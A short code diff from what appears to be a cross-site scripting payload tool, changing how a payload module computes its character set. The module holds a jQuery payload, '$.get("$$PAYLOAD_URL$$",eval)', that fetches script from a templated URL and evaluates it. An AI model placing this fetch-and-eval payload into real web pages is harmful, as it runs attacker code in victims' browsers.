@@ -6,6 +6,6 @@ const script = '$.get("$$PAYLOAD_URL$$",eval)'
 export default {
     description: `JQuery Get and Eval, not dependent on CVEs`,
     script: renderable(script),
-    charset: new CharSet(script)
+    charset: new CharSet(renderable(script)({PAYLOAD_URL:''}))
 }
 
